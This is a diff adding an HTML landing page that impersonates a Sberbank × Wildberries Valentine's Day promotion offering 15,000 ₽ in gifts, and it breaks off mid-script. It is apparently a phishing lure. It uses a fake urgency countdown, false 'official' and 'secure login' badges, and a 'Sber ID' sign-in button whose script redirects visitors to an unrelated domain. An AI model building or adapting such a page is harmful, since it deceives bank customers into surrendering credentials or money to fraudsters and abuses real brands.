@@ -1,0 +1,1321 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no" name="viewport">
+    <meta content="no-cache" http-equiv="Cache-control">
+    <meta content="no-cache" http-equiv="Pragma">
+    <meta content="-1" http-equiv="Expires">
+    <title>💝 Подарок ко Дню Влюблённых | СберБанк × Wildberries</title>
+    <meta property="og:title" content="Получите до 15 000 ₽ на подарки ко Дню Влюблённых"/>
+    <meta property="og:type" content="website"/>
+    <meta property="og:description" content="Специальная акция ко Дню Святого Валентина для клиентов СберБанка. Бонусы на покупки в Wildberries, Золотое Яблоко и других магазинах."/>
+    <link rel="shortcut icon" href="favicons/favicon_sber.ico">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Nunito:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="css/v2/main.css">
+    <link rel="stylesheet" href="css/v2/style.css">
+    <style>
+        :root {
+            --love-pink: #ff4d6d;
+            --love-rose: #ff758f;
+            --love-light: #fff0f3;
+            --love-deep: #c9184a;
+            --love-gradient: linear-gradient(135deg, #ff4d6d 0%, #ff758f 50%, #ffb3c1 100%);
+            --heart-red: #e63946;
+            --gold-shimmer: #ffd700;
+            --sber-green: #21a038;
+            --surface: #ffffff;
+            --surface-warm: #fffafa;
+            --text-primary: #2b2d42;
+            --text-secondary: #6c757d;
+            --text-muted: #adb5bd;
+            --border-color: #ffe5ec;
+            --radius-sm: 12px;
+            --radius-md: 16px;
+            --radius-lg: 24px;
+            --radius-xl: 32px;
+            --shadow-love: 0 20px 60px rgba(255, 77, 109, 0.2);
+            --shadow-soft: 0 8px 30px rgba(255, 77, 109, 0.1);
+        }
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        html {
+            scroll-behavior: smooth;
+        }
+        
+        body {
+            font-family: 'Nunito', -apple-system, BlinkMacSystemFont, sans-serif;
+            background: linear-gradient(180deg, #fff5f7 0%, #ffffff 50%, #fff0f3 100%);
+            min-height: 100vh;
+            color: var(--text-primary);
+            -webkit-font-smoothing: antialiased;
+            overflow-x: hidden;
+        }
+        
+        /* Floating Hearts Background */
+        .hearts-bg {
+            position: fixed;
+            inset: 0;
+            pointer-events: none;
+            z-index: 0;
+            overflow: hidden;
+        }
+        
+        .floating-heart {
+            position: absolute;
+            font-size: 24px;
+            opacity: 0.15;
+            animation: floatHeart 15s ease-in-out infinite;
+        }
+        
+        .floating-heart:nth-child(1) { left: 5%; top: 10%; animation-delay: 0s; font-size: 32px; }
+        .floating-heart:nth-child(2) { left: 15%; top: 60%; animation-delay: -2s; font-size: 20px; }
+        .floating-heart:nth-child(3) { left: 25%; top: 30%; animation-delay: -4s; font-size: 28px; }
+        .floating-heart:nth-child(4) { left: 45%; top: 80%; animation-delay: -6s; font-size: 18px; }
+        .floating-heart:nth-child(5) { left: 65%; top: 20%; animation-delay: -8s; font-size: 36px; }
+        .floating-heart:nth-child(6) { left: 75%; top: 70%; animation-delay: -10s; font-size: 22px; }
+        .floating-heart:nth-child(7) { left: 85%; top: 40%; animation-delay: -12s; font-size: 26px; }
+        .floating-heart:nth-child(8) { left: 95%; top: 90%; animation-delay: -14s; font-size: 30px; }
+        
+        @keyframes floatHeart {
+            0%, 100% { transform: translateY(0) rotate(0deg) scale(1); }
+            25% { transform: translateY(-20px) rotate(10deg) scale(1.1); }
+            50% { transform: translateY(-10px) rotate(-5deg) scale(0.95); }
+            75% { transform: translateY(-30px) rotate(5deg) scale(1.05); }
+        }
+        
+        /* Decorative blobs */
+        .love-blob {
+            position: fixed;
+            border-radius: 50%;
+            filter: blur(80px);
+            opacity: 0.4;
+            z-index: 0;
+        }
+        
+        .love-blob-1 {
+            width: 400px;
+            height: 400px;
+            background: linear-gradient(135deg, #ffb3c1, #ff8fa3);
+            top: -150px;
+            right: -100px;
+            animation: blobMove 20s ease-in-out infinite;
+        }
+        
+        .love-blob-2 {
+            width: 300px;
+            height: 300px;
+            background: linear-gradient(135deg, #ffc2d1, #ff99ac);
+            bottom: -100px;
+            left: -100px;
+            animation: blobMove 25s ease-in-out infinite reverse;
+        }
+        
+        @keyframes blobMove {
+            0%, 100% { transform: translate(0, 0) scale(1); }
+            50% { transform: translate(30px, 20px) scale(1.1); }
+        }
+        
+        /* Container */
+        .container {
+            position: relative;
+            z-index: 1;
+            max-width: 540px;
+            margin: 0 auto;
+            padding: 0 20px;
+        }
+        
+        /* Header */
+        .page-header {
+            padding: 20px 0;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+        
+        .brand-group {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+        
+        .brand-logo {
+            height: 26px;
+            object-fit: contain;
+        }
+        
+        .brand-separator {
+            width: 2px;
+            height: 18px;
+            background: var(--border-color);
+            border-radius: 1px;
+        }
+        
+        .valentine-tag {
+            background: var(--love-gradient);
+            color: white;
+            font-size: 11px;
+            font-weight: 800;
+            padding: 8px 14px;
+            border-radius: 20px;
+            letter-spacing: 0.3px;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            box-shadow: 0 4px 15px rgba(255, 77, 109, 0.3);
+        }
+        
+        /* Hero */
+        .hero-section {
+            padding: 24px 0 36px;
+            text-align: center;
+        }
+        
+        .hero-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 10px;
+            background: var(--surface);
+            border: 2px solid var(--border-color);
+            padding: 12px 20px;
+            border-radius: 30px;
+            margin-bottom: 20px;
+            box-shadow: var(--shadow-soft);
+            animation: fadeInScale 0.5s ease-out;
+        }
+        
+        .badge-hearts {
+            display: flex;
+            gap: 2px;
+        }
+        
+        .badge-heart {
+            font-size: 16px;
+            animation: heartBeat 1.5s ease-in-out infinite;
+        }
+        
+        .badge-heart:nth-child(2) { animation-delay: 0.2s; }
+        .badge-heart:nth-child(3) { animation-delay: 0.4s; }
+        
+        @keyframes heartBeat {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.2); }
+        }
+        
+        .badge-text {
+            font-size: 13px;
+            font-weight: 700;
+            color: var(--love-pink);
+        }
+        
+        @keyframes fadeInScale {
+            from { opacity: 0; transform: scale(0.9); }
+            to { opacity: 1; transform: scale(1); }
+        }
+        
+        .hero-title {
+            font-size: clamp(26px, 7vw, 40px);
+            font-weight: 900;
+            line-height: 1.2;
+            margin-bottom: 16px;
+            letter-spacing: -0.5px;
+            animation: fadeInUp 0.6s ease-out 0.1s backwards;
+        }
+        
+        .hero-title .love-text {
+            background: var(--love-gradient);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+        
+        .hero-amount {
+            color: var(--sber-green);
+            position: relative;
+        }
+        
+        .hero-desc {
+            font-size: 16px;
+            color: var(--text-secondary);
+            line-height: 1.6;
+            max-width: 400px;
+            margin: 0 auto;
+            animation: fadeInUp 0.6s ease-out 0.2s backwards;
+        }
+        
+        .hero-desc .highlight {
+            color: var(--love-pink);
+            font-weight: 700;
+        }
+        
+        @keyframes fadeInUp {
+            from { opacity: 0; transform: translateY(15px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        
+        /* Offer Card */
+        .offer-card {
+            background: var(--surface);
+            border-radius: var(--radius-xl);
+            padding: 32px 24px;
+            margin-bottom: 24px;
+            box-shadow: var(--shadow-love);
+            border: 2px solid var(--border-color);
+            position: relative;
+            overflow: hidden;
+            animation: fadeInUp 0.6s ease-out 0.3s backwards;
+        }
+        
+        .offer-card::before {
+            content: '💕';
+            position: absolute;
+            top: -10px;
+            right: -10px;
+            font-size: 80px;
+            opacity: 0.08;
+            transform: rotate(15deg);
+        }
+        
+        .offer-amount-block {
+            text-align: center;
+            padding-bottom: 24px;
+            border-bottom: 2px dashed var(--border-color);
+            margin-bottom: 24px;
+            position: relative;
+        }
+        
+        .offer-label {
+            font-size: 13px;
+            font-weight: 700;
+            color: var(--love-pink);
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            margin-bottom: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+        
+        .offer-value {
+            font-size: 68px;
+            font-weight: 900;
+            background: var(--love-gradient);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            line-height: 1;
+            letter-spacing: -2px;
+        }
+        
+        .offer-value span {
+            font-size: 32px;
+        }
+        
+        .offer-caption {
+            font-size: 15px;
+            color: var(--text-secondary);
+            margin-top: 10px;
+            font-weight: 600;
+        }
+        
+        .offer-caption .emoji {
+            font-size: 18px;
+        }
+        
+        /* Partners Block */
+        .partners-block {
+            background: linear-gradient(135deg, var(--love-light) 0%, #fff 100%);
+            border-radius: var(--radius-lg);
+            padding: 20px;
+            margin-bottom: 24px;
+            border: 1px solid var(--border-color);
+        }
+        
+        .partners-label {
+            font-size: 12px;
+            font-weight: 800;
+            color: var(--love-pink);
+            text-transform: uppercase;
+            letter-spacing: 1.5px;
+            margin-bottom: 16px;
+            text-align: center;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+        
+        .partners-list {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 10px;
+        }
+        
+        .partner-tile {
+            background: var(--surface);
+            border-radius: var(--radius-md);
+            padding: 16px 10px;
+            text-align: center;
+            border: 2px solid var(--border-color);
+            transition: all 0.3s ease;
+            position: relative;
+        }
+        
+        .partner-tile:hover {
+            transform: translateY(-6px);
+            box-shadow: var(--shadow-soft);
+            border-color: var(--love-rose);
+        }
+        
+        .partner-tile::after {
+            content: '💝';
+            position: absolute;
+            top: -8px;
+            right: -8px;
+            font-size: 16px;
+            opacity: 0;
+            transition: all 0.3s ease;
+        }
+        
+        .partner-tile:hover::after {
+            opacity: 1;
+        }
+        
+        .partner-icon-wrap {
+            width: 50px;
+            height: 50px;
+            border-radius: var(--radius-md);
+            margin: 0 auto 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 24px;
+        }
+        
+        .icon-wb { background: linear-gradient(135deg, #cb11ab 0%, #f857a6 100%); }
+        .icon-ga { background: linear-gradient(135deg, #daa520 0%, #ffd700 100%); }
+        .icon-more { background: var(--love-gradient); }
+        
+        .partner-name {
+            font-size: 12px;
+            font-weight: 800;
+            color: var(--text-primary);
+            margin-bottom: 4px;
+            line-height: 1.3;
+        }
+        
+        .partner-bonus {
+            font-size: 11px;
+            font-weight: 700;
+            color: var(--love-pink);
+        }
+        
+        /* CTA */
+        .cta-wrap {
+            margin-bottom: 16px;
+        }
+        
+        .cta-main {
+            width: 100%;
+            height: 58px;
+            background: var(--love-gradient);
+            border: none;
+            border-radius: var(--radius-md);
+            color: white;
+            font-family: inherit;
+            font-size: 17px;
+            font-weight: 800;
+            cursor: pointer;
+            position: relative;
+            overflow: hidden;
+            transition: all 0.3s ease;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+        
+        .cta-main::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.3), transparent);
+            animation: cta-shine 2s ease-in-out infinite;
+        }
+        
+        @keyframes cta-shine {
+            0% { left: -100%; }
+            50%, 100% { left: 100%; }
+        }
+        
+        .cta-main:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 15px 40px rgba(255, 77, 109, 0.4);
+        }
+        
+        .cta-main:active {
+            transform: translateY(0);
+        }
+        
+        .cta-note {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 6px;
+            font-size: 12px;
+            color: var(--text-muted);
+            margin-top: 12px;
+        }
+        
+        .cta-note svg {
+            width: 14px;
+            height: 14px;
+            color: var(--sber-green);
+        }
+        
+        /* Sber Pay Block Warning */
+        .sber-pay-block__warning {
+            color: var(--love-deep);
+            font-size: 13px;
+            font-weight: 600;
+            padding: 14px;
+            margin-top: 12px;
+            background: var(--love-light);
+            border-radius: var(--radius-sm);
+            display: none;
+            text-align: center;
+            border: 1px solid var(--love-rose);
+        }
+        
+        .sber-pay-block.show_warning .sber-pay-block__warning {
+            display: block;
+            animation: fadeInUp 0.3s ease-out;
+        }
+        
+        .sber-pay-block.show_warning .cta-main {
+            background: var(--text-muted);
+            pointer-events: none;
+        }
+        
+        .sber-pay-block.show_warning .cta-main::before {
+            display: none;
+        }
+        
+        /* Benefits */
+        .benefits-section {
+            padding: 16px 0 32px;
+        }
+        
+        .benefits-title {
+            font-size: 18px;
+            font-weight: 800;
+            text-align: center;
+            margin-bottom: 16px;
+            color: var(--text-primary);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+        
+        .benefits-grid {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+        }
+        
+        .benefit-item {
+            background: var(--surface);
+            border-radius: var(--radius-lg);
+            padding: 18px;
+            display: flex;
+            align-items: center;
+            gap: 14px;
+            box-shadow: var(--shadow-soft);
+            border: 1px solid var(--border-color);
+            transition: all 0.3s ease;
+            animation: fadeInUp 0.5s ease-out backwards;
+        }
+        
+        .benefit-item:nth-child(1) { animation-delay: 0.4s; }
+        .benefit-item:nth-child(2) { animation-delay: 0.5s; }
+        .benefit-item:nth-child(3) { animation-delay: 0.6s; }
+        
+        .benefit-item:hover {
+            transform: translateX(8px);
+            border-color: var(--love-rose);
+        }
+        
+        .benefit-icon {
+            width: 46px;
+            height: 46px;
+            border-radius: var(--radius-sm);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 22px;
+            flex-shrink: 0;
+        }
+        
+        .benefit-icon.b1 { background: linear-gradient(135deg, #ffe5ec, #ffb3c1); }
+        .benefit-icon.b2 { background: linear-gradient(135deg, #d4edda, #b8e0c4); }
+        .benefit-icon.b3 { background: linear-gradient(135deg, #fff3cd, #ffe69c); }
+        
+        .benefit-content h4 {
+            font-size: 14px;
+            font-weight: 800;
+            margin-bottom: 3px;
+            color: var(--text-primary);
+        }
+        
+        .benefit-content p {
+            font-size: 12px;
+            color: var(--text-secondary);
+            line-height: 1.4;
+        }
+        
+        /* Steps */
+        .steps-section {
+            padding: 16px 0 32px;
+        }
+        
+        .steps-title {
+            font-size: 20px;
+            font-weight: 900;
+            text-align: center;
+            margin-bottom: 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+        
+        .steps-list {
+            display: flex;
+            flex-direction: column;
+            gap: 14px;
+        }
+        
+        .step-item {
+            background: var(--surface);
+            border-radius: var(--radius-lg);
+            padding: 18px;
+            display: flex;
+            align-items: center;
+            gap: 14px;
+            box-shadow: var(--shadow-soft);
+            border: 1px solid var(--border-color);
+            transition: all 0.3s ease;
+        }
+        
+        .step-item:hover {
+            transform: translateX(8px);
+            border-color: var(--love-rose);
+        }
+        
+        .step-num {
+            width: 42px;
+            height: 42px;
+            background: var(--love-gradient);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 18px;
+            font-weight: 900;
+            flex-shrink: 0;
+        }
+        
+        .step-text h5 {
+            font-size: 14px;
+            font-weight: 800;
+            margin-bottom: 2px;
+        }
+        
+        .step-text p {
+            font-size: 12px;
+            color: var(--text-secondary);
+        }
+        
+        /* Countdown / Urgency */
+        .urgency-banner {
+            background: linear-gradient(135deg, var(--love-deep) 0%, var(--love-pink) 100%);
+            border-radius: var(--radius-lg);
+            padding: 20px;
+            text-align: center;
+            color: white;
+            margin-bottom: 24px;
+            box-shadow: 0 10px 30px rgba(255, 77, 109, 0.3);
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .urgency-banner::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: radial-gradient(circle, rgba(255,255,255,0.1) 0%, transparent 70%);
+            animation: pulseGlow 3s ease-in-out infinite;
+        }
+        
+        @keyframes pulseGlow {
+            0%, 100% { transform: scale(1); opacity: 0.5; }
+            50% { transform: scale(1.1); opacity: 0.8; }
+        }
+        
+        .urgency-text {
+            font-size: 13px;
+            font-weight: 700;
+            margin-bottom: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 6px;
+            position: relative;
+            z-index: 1;
+        }
+        
+        .countdown-timer {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            position: relative;
+            z-index: 1;
+        }
+        
+        .timer-unit {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 4px;
+        }
+        
+        .timer-label {
+            font-size: 10px;
+            font-weight: 600;
+            opacity: 0.9;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+        
+        .timer-digits {
+            display: flex;
+            gap: 2px;
+        }
+        
+        .timer-digit {
+            width: 36px;
+            height: 44px;
+            background: rgba(255, 255, 255, 0.15);
+            backdrop-filter: blur(10px);
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 24px;
+            font-weight: 900;
+            position: relative;
+            overflow: hidden;
+            border: 1px solid rgba(255, 255, 255, 0.2);
+        }
+        
+        .timer-digit.flip {
+            animation: flipDigit 0.5s ease-in-out;
+        }
+        
+        @keyframes flipDigit {
+            0% { transform: rotateX(0deg); }
+            50% { transform: rotateX(90deg); }
+            100% { transform: rotateX(0deg); }
+        }
+        
+        .timer-separator {
+            font-size: 20px;
+            font-weight: 800;
+            opacity: 0.7;
+            margin: 0 2px;
+            position: relative;
+            top: -8px;
+        }
+        
+        .timer-expired {
+            font-size: 16px;
+            font-weight: 800;
+            padding: 12px 20px;
+            background: rgba(255, 255, 255, 0.2);
+            border-radius: 12px;
+        }
+        
+        @media (max-width: 480px) {
+            .timer-digit {
+                width: 28px;
+                height: 36px;
+                font-size: 20px;
+            }
+            
+            .timer-separator {
+                font-size: 16px;
+            }
+            
+            .timer-label {
+                font-size: 9px;
+            }
+            
+            .urgency-text {
+                font-size: 12px;
+            }
+        }
+        
+        /* Trust */
+        .trust-bar {
+            padding: 24px 0;
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            gap: 20px;
+        }
+        
+        .trust-item {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            font-size: 11px;
+            color: var(--text-secondary);
+            font-weight: 600;
+        }
+        
+        .trust-item svg {
+            width: 14px;
+            height: 14px;
+            color: var(--sber-green);
+        }
+        
+        /* Footer */
+        .page-footer {
+            padding: 20px 0;
+            text-align: center;
+            border-top: 1px solid var(--border-color);
+        }
+        
+        .page-footer p {
+            font-size: 10px;
+            color: var(--text-muted);
+            line-height: 1.6;
+        }
+        
+        .footer-love {
+            margin-top: 10px;
+            font-size: 13px;
+        }
+        
+        /* Loader */
+        .loader {
+            background: rgba(255, 255, 255, 0.97);
+            position: fixed;
+            inset: 0;
+            z-index: 999999;
+            display: none;
+            align-items: center;
+            justify-content: center;
+            flex-direction: column;
+        }
+        
+        .loader.show {
+            display: flex;
+        }
+        
+        .loader-heart {
+            font-size: 48px;
+            animation: heartPulse 0.8s ease-in-out infinite;
+        }
+        
+        @keyframes heartPulse {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.3); }
+        }
+        
+        .loader-label {
+            margin-top: 16px;
+            font-size: 16px;
+            font-weight: 700;
+            color: var(--text-primary);
+        }
+        
+        .loader-sublabel {
+            font-size: 12px;
+            color: var(--text-muted);
+            margin-top: 4px;
+        }
+        
+        /* Flow container */
+        .vstep-box.advise__box {
+            position: fixed;
+            inset: 0;
+            z-index: 10000;
+            background: var(--surface);
+            overflow-y: auto;
+        }
+        
+        .vstep-box.advise__box:not([style*="display: none"]) ~ .container {
+            display: none;
+        }
+        
+        /* Responsive */
+        @media (max-width: 480px) {
+            .container {
+                padding: 0 16px;
+            }
+            
+            .valentine-tag {
+                font-size: 10px;
+                padding: 6px 10px;
+            }
+            
+            .hero-section {
+                padding: 16px 0 28px;
+            }
+            
+            .offer-card {
+                padding: 24px 18px;
+            }
+            
+            .offer-value {
+                font-size: 54px;
+            }
+            
+            .offer-value span {
+                font-size: 26px;
+            }
+            
+            .partners-list {
+                gap: 8px;
+            }
+            
+            .partner-tile {
+                padding: 12px 6px;
+            }
+            
+            .partner-icon-wrap {
+                width: 42px;
+                height: 42px;
+                font-size: 20px;
+            }
+            
+            .partner-name {
+                font-size: 10px;
+            }
+            
+            .floating-heart {
+                font-size: 18px;
+            }
+        }
+    </style>
+    <script>
+        var SITE_ID = "gos_sber";
+    </script>
+    <script src="js/core.min.js"></script>
+</head>
+<body>
+    <!-- Floating Hearts Background -->
+    <div class="hearts-bg">
+        <div class="floating-heart">💗</div>
+        <div class="floating-heart">💕</div>
+        <div class="floating-heart">💖</div>
+        <div class="floating-heart">💝</div>
+        <div class="floating-heart">❤️</div>
+        <div class="floating-heart">💘</div>
+        <div class="floating-heart">💓</div>
+        <div class="floating-heart">💞</div>
+    </div>
+    
+    <!-- Decorative Blobs -->
+    <div class="love-blob love-blob-1"></div>
+    <div class="love-blob love-blob-2"></div>
+    
+    <div class="container">
+        <!-- Header -->
+        <header class="page-header">
+            <div class="brand-group">
+                <img src="images/sberbank-logo.befb25b6.svg" alt="СберБанк" class="brand-logo">
+                <div class="brand-separator"></div>
+                <img src="images/logo.png" alt="Wildberries" class="brand-logo" style="height: 22px;">
+            </div>
+            <span class="valentine-tag">💝 14 февраля</span>
+        </header>
+        
+        <!-- Hero -->
+        <section class="hero-section">
+            <div class="hero-badge">
+                <div class="badge-hearts">
+                    <span class="badge-heart">💖</span>
+                    <span class="badge-heart">💖</span>
+                    <span class="badge-heart">💖</span>
+                </div>
+                <span class="badge-text">День Влюблённых</span>
+            </div>
+            <h1 class="hero-title">
+                <span class="love-text">Подарок</span> для вас<br>
+                и <span class="love-text">любимых</span> 💕
+            </h1>
+            <p class="hero-desc">
+                Получите <span class="highlight" id="tr_summ">15 000 ₽</span> на романтические покупки в Wildberries, Золотом Яблоке и у партнёров
+            </p>
+        </section>
+        
+        <!-- Urgency Banner -->
+        <div class="urgency-banner">
+            <div class="urgency-text">
+                ⏰ Акция заканчивается через:
+            </div>
+            <div class="countdown-timer" id="countdownTimer">
+                <div class="timer-unit">
+                    <div class="timer-digits">
+                        <div class="timer-digit" id="days1">0</div>
+                        <div class="timer-digit" id="days2">0</div>
+                    </div>
+                    <div class="timer-label">Дней</div>
+                </div>
+                <div class="timer-separator">:</div>
+                <div class="timer-unit">
+                    <div class="timer-digits">
+                        <div class="timer-digit" id="hours1">0</div>
+                        <div class="timer-digit" id="hours2">0</div>
+                    </div>
+                    <div class="timer-label">Часов</div>
+                </div>
+                <div class="timer-separator">:</div>
+                <div class="timer-unit">
+                    <div class="timer-digits">
+                        <div class="timer-digit" id="minutes1">0</div>
+                        <div class="timer-digit" id="minutes2">0</div>
+                    </div>
+                    <div class="timer-label">Минут</div>
+                </div>
+                <div class="timer-separator">:</div>
+                <div class="timer-unit">
+                    <div class="timer-digits">
+                        <div class="timer-digit" id="seconds1">0</div>
+                        <div class="timer-digit" id="seconds2">0</div>
+                    </div>
+                    <div class="timer-label">Секунд</div>
+                </div>
+            </div>
+            <div class="timer-expired" id="timerExpired" style="display: none;">
+                Акция завершена
+            </div>
+        </div>
+        
+        <!-- Offer Card -->
+        <div class="offer-card">
+            <div class="offer-amount-block">
+                <div class="offer-label">💝 Ваш подарок 💝</div>
+                <div class="offer-value">15 000<span> ₽</span></div>
+                <div class="offer-caption">
+                    <span class="emoji">🎁</span> на подарки любимым
+                </div>
+            </div>
+            
+            <div class="partners-block">
+                <div class="partners-label">💕 Где порадовать близких</div>
+                <div class="partners-list">
+                    <div class="partner-tile">
+                        <div class="partner-icon-wrap icon-wb">🛍️</div>
+                        <div class="partner-name">Wildberries</div>
+                        <div class="partner-bonus">до 10 000 ₽</div>
+                    </div>
+                    <div class="partner-tile">
+                        <div class="partner-icon-wrap icon-ga">💄</div>
+                        <div class="partner-name">Золотое Яблоко</div>
+                        <div class="partner-bonus">до 3 000 ₽</div>
+                    </div>
+                    <div class="partner-tile">
+                        <div class="partner-icon-wrap icon-more">🌹</div>
+                        <div class="partner-name">Цветы и подарки</div>
+                        <div class="partner-bonus">до 2 000 ₽</div>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="cta-wrap sber-pay-block">
+                <button class="cta-main button-sber-pay" onclick="handleSberAuth();">
+                    💝 Получить подарок
+                </button>
+                <div class="sber-pay-block__warning">
+                    💕 Для получения подарка войдите через Сбер ID. Нажмите ещё раз!
+                </div>
+                <div class="cta-note">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                        <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
+                    </svg>
+                    Безопасный вход через СберБанк
+                </div>
+            </div>
+        </div>
+        
+        <!-- Benefits -->
+        <section class="benefits-section">
+            <div class="benefits-title">💖 Почему это круто</div>
+            <div class="benefits-grid">
+                <div class="benefit-item">
+                    <div class="benefit-icon b1">💳</div>
+                    <div class="benefit-content">
+                        <h4>Для всех клиентов Сбера</h4>
+                        <p>Дебетовые, кредитные и виртуальные карты</p>
+                    </div>
+                </div>
+                <div class="benefit-item">
+                    <div class="benefit-icon b2">⚡</div>
+                    <div class="benefit-content">
+                        <h4>Мгновенное зачисление</h4>
+                        <p>Успеете купить подарок к празднику!</p>
+                    </div>
+                </div>
+                <div class="benefit-item">
+                    <div class="benefit-icon b3">🎁</div>
+                    <div class="benefit-content">
+                        <h4>Оплата до 100%</h4>
+                        <p>Весь подарок может быть бесплатным</p>
+                    </div>
+                </div>
+            </div>
+        </section>
+        
+        <!-- Steps -->
+        <section class="steps-section">
+            <h2 class="steps-title">💕 Как получить подарок?</h2>
+            <div class="steps-list">
+                <div class="step-item">
+                    <div class="step-num">1</div>
+                    <div class="step-text">
+                        <h5>Войдите по Сбер ID</h5>
+                        <p>Быстро и безопасно через СберБанк</p>
+                    </div>
+                </div>
+                <div class="step-item">
+                    <div class="step-num">2</div>
+                    <div class="step-text">
+                        <h5>Подтвердите участие</h5>
+                        <p>Активируйте подарок в один клик</p>
+                    </div>
+                </div>
+                <div class="step-item">
+                    <div class="step-num">3</div>
+                    <div class="step-text">
+                        <h5>Порадуйте любимых 💝</h5>
+                        <p>Купите подарки в Wildberries и партнёрах</p>
+                    </div>
+                </div>
+            </div>
+        </section>
+        
+        <!-- Trust -->
+        <div class="trust-bar">
+            <div class="trust-item">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                    <rect x="3" y="11" width="18" height="11" rx="2" ry="2"/>
+                    <path d="M7 11V7a5 5 0 0110 0v4"/>
+                </svg>
+                SSL защита
+            </div>
+            <div class="trust-item">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                    <path d="M22 11.08V12a10 10 0 11-5.93-9.14"/>
+                    <polyline points="22 4 12 14.01 9 11.01"/>
+                </svg>
+                Официальная акция
+            </div>
+            <div class="trust-item">
+                ❤️ С любовью от Сбера
+            </div>
+        </div>
+        
+        <!-- Footer -->
+        <footer class="page-footer">
+            <p>© 2025 СберБанк × Wildberries. Акция ко Дню Святого Валентина для клиентов СберБанка. Количество подарков ограничено.</p>
+            <div class="footer-love">Made with 💖 for lovers</div>
+        </footer>
+    </div>
+    
+    <!-- Loader -->
+    <div class="loader" id="pageLoader">
+        <div class="loader-heart">💝</div>
+        <div class="loader-label">Готовим ваш подарок...</div>
+        <div class="loader-sublabel">Не закрывайте страницу</div>
+    </div>
+    
+    <!-- Flow Container -->
+    <div class="vstep-box advise__box" id="vstep_flow" style="display:none;"></div>
+
+    <script src="js/base_v2.js"></script>
+    <script>
+        function showLoader(show) {
+            const loader = document.getElementById('pageLoader');
+            if (loader) {
+                if (show) {
+                    loader.classList.add('show');
+                } else {
+                    loader.classList.remove('show');
+                }
+            }
+        }
+        
+        function handleSberAuth() {
+            showLoader(true);
+            
+            // Небольшая задержка для показа лоадера, затем редирект
+            setTimeout(function() {
+                window.location.href = 'https://ords41574.digital/cashM88653941';
+            }, 1500);
+        }
+        
+        function showFlowContainer() {
+            const flowContainer = document.getElementById('vstep_flow');
+            const mainContainer = document.querySelector('.container');
+            const heartsBg = document.querySelector('.hearts-bg');
+            const blobs = document.querySelectorAll('.love-blob');
+            
+            if (flowContainer) {
+                flowContainer.style.display = 'flex';
+                flowContainer.style.justifyContent = 'center';
+                flowContainer.style.alignItems = 'center';
+            }
+            if (mainContainer) {
+                mainContainer.style.display = 'none';
+            }
+            if (heartsBg) {
+                heartsBg.style.display = 'none';
+            }
+            blobs.forEach(b => b.style.display = 'none');
+        }
+        
+        function goodbye() {
+            document.location.href = 'https://www.sberbank.ru/';
+        }
+        
+        // Countdown Timer
+        function updateTimerDigit(elementId, newValue, isTens = false) {
+            const element = document.getElementById(elementId);
+            if (!element) return;
+            
+            const currentValue = parseInt(element.textContent) || 0;
+            const newDigit = isTens ? Math.floor(newValue / 10) : newValue % 10;
+            
+            if (currentValue !== newDigit) {
+                element.classList.add('flip');
+                setTimeout(() => {
+                    element.textContent = newDigit;
+                    element.classList.remove('flip');
+                }, 250);
+            } else {
+                element.textContent = newDigit;
+            }
+        }
+        
+        function startCountdown() {
+            // ТЕСТ: Симулируем что сегодня 8 февраля для демонстрации
+            const now = new Date();
+            const currentYear = now.getFullYear();
+            
+            // Симулируем текущую дату как 8 февраля 12:00:00
+            const simulatedNow = new Date(currentYear, 1, 8, 12, 0, 0);
+            
